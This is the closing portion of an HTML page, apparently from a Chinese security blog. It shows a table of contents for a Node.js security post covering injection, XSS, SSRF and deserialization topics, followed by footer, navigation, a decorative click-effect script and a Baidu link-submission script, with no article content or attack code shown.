+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-基本概念"><span class="toc-text">0x01 基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境安装、基础语法与特性"><span class="toc-text">环境安装、基础语法与特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第一个应用"><span class="toc-text">第一个应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Express框架"><span class="toc-text">Express框架</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Node-js安全"><span class="toc-text">0x02 Node.js安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#代码注入"><span class="toc-text">代码注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令注入"><span class="toc-text">命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP参数污染"><span class="toc-text">HTTP参数污染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入"><span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件上传"><span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NPM"><span class="toc-text">NPM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反序列化漏洞"><span class="toc-text">反序列化漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-工具"><span class="toc-text">0x03 工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-text">0x04 参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2020/03/28/Linux安全笔记/" rel="next" title="Linux安全笔记">
+          Linux安全笔记
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2020/03/29/node-serialize反序列化漏洞/" rel="prev" title="node-serialize反序列化漏洞">
+            node-serialize反序列化漏洞
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
